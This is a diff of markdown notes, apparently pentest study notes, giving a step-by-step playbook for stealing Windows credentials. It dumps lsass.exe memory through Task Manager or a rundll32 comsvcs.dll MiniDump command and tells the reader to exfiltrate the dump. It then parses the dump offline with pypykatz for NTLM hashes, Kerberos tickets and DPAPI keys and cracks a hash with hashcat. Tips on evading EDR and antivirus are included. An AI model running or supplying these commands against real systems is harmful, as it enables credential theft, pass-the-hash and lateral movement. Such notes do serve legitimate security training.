@@ -1,57 +1,68 @@
-# Attacking LSASS
-```table-of-contents
-```
-## Method 1: Task Manager (GUI)
-If we have RDP/GUI access as an Administrator:
-1. Open **Task Manager**.
+# Attacking LSASS (Credential Dumping)
+**Concept:** The `lsass.exe` process manages authentication. By dumping its memory to a file, we can extract secrets (hashes, tickets, keys) offline. 
+> [!Warning]
+> Accessing `lsass.exe` is a **High Alert** action. Modern EDRs and Antivirus (Defender) heavily monitor handle requests to this process.
+## 1. Extraction: Method 1 (GUI - Task Manager)
+**Context:** You have RDP or VNC access as a Local Administrator. This is often "stealthier" against basic AV than running Mimikatz.exe directly.
+1. Open **Task Manager** (`Ctrl+Shift+Esc`). 
 2. Go to the **Details** tab.
 3. Right-click `lsass.exe`.
 4. Select **Create dump file**.
 
-File location: `C:\Users\<User>\AppData\Local\Temp\lsass.DMP`.
-## Method 2: Rundll32 (CLI)
-### Step 1: Find LSASS PID
-**CMD:**
+- **Location:** The file is saved to `C:\Users\<User>\AppData\Local\Temp\lsass.DMP`.
+- **Action:** Move this file to a non-system folder immediately and exfiltrate it.
+## 2. Extraction: Method 2 (CLI - Rundll32)
+**Context:** You have a shell (Cmd/PowerShell) as Administrator/SYSTEM. This uses a "Living Off The Land" binary (`comsvcs.dll`) to dump memory, often bypassing simple whitelist restrictions.
+### Step 1: Find the PID
+We need the Process ID (PID) of `lsass.exe`.
 ```powershell
+# Command Prompt
 tasklist /svc | findstr lsass
+
+# PowerShell
+Get-Process lsass | Select-Object Id
 ```
-**PowerShell:**
+### Step 2: Create the Dump
+**Syntax:** `rundll32 <DLL>, MiniDump <PID> <Output_File> full`
 ```powershell
-Get-Process lsass
-# Look for the 'Id' column
+# Example (Assuming PID is 672)
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\lsass.dmp full
 ```
-### Step 2: Create Dump
-```powershell
-# Syntax: rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <OutputFile> full
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
-```
-## Offline Extraction (Pypykatz)
-Once you have transferred the `lsass.dmp` file to your attack box (using SMB, Netcat, etc.), use **pypykatz** to parse it. Pypykatz is a Python implementation of Mimikatz that works on Linux.
+## 3. Offline Extraction (Pypykatz)
+**Context:** Pypykatz is a Python implementation of Mimikatz. Running it **offline** on your Kali machine is safer than uploading the Mimikatz binary to the target.
+1. **Exfiltrate:** Transfer `lsass.dmp` from the victim to your attacker machine.
+2. **Parse:** Use Pypykatz to extract secrets.
 ```shell
-# Syntax: pypykatz lsa minidump <path_to_dmp_file>
-pypykatz lsa minidump /home/user/lsass.dmp
+# Install
+pip3 install pypykatz
+
+# Parse the dump file
+pypykatz lsa minidump /home/kali/loot/lsass.dmp
 ```
-### Understanding the Output
-| **Section**  | **Content**         | **Utility**                                                                 |
-| ------------ | ------------------- | --------------------------------------------------------------------------- |
-| `MSV`      | NTLM Hashes         | Can be cracked (Hashcat) or used in Pass-the-Hash.                          |
-| `WDIGEST`  | Cleartext Passwords | Older protocols. Often "null" on modern Windows (unless registry modified). |
-| `Kerberos` | Tickets/Keys        | TGTs/TGSs for Pass-the-Ticket or Overpass-the-Hash.                         |
-| `DPAPI`    | Master Keys         | Used to decrypt Chrome passwords, Outlook credentials, RDP saves.           |
+## 4. Analyzing the Output
+Pypykatz will output several sections. Here is what matters:
+
+| **Section**  | **Content**      | **Utility**                                                                            |
+| ------------ | ---------------- | -------------------------------------------------------------------------------------- |
+| *MSV*      | *NTLM Hashes*  | The most common target. Crack these or use them for **Pass-the-Hash**.                 |
+| *WDIGEST*  | *Cleartext*    | Often `(null)` on Windows 10/Server 2016+ (unless a specific registry key is enabled). |
+| *Kerberos* | *Tickets/Keys* | Contains TGTs and TGSs. Used for **Pass-the-Ticket** or Overpass-the-Hash.             |
+| *DPAPI*    | *Master Keys*  | Used to decrypt Chrome passwords, Outlook credentials, and RDP saved connections.      |
 ### Example Output Analysis
-```txt
+```powershell
 == MSV ==
     Username: bob
     Domain: DESKTOP-33E7O54
-    NT: 64f12cddaa88057e06a81b54e73b949b  <-- Crack this
+    NT: 64f12cddaa88057e06a81b54e73b949b  <-- TARGET (NTLM Hash)
     SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
 
 == WDIGEST ==
     username bob
-    password (hex)                        <-- Often empty on Win10+
+    password (null)                       <-- WDigest is disabled (Standard)
 ```
-## Cracking Extracted Hashes
+## 5. Cracking the Hash
+**Context:** You extracted the NTLM hash (`NT`) from the MSV section.
 ```shell
-# Crack the extracted NT hash
+# Hashcat Mode 1000 (NTLM)
 hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
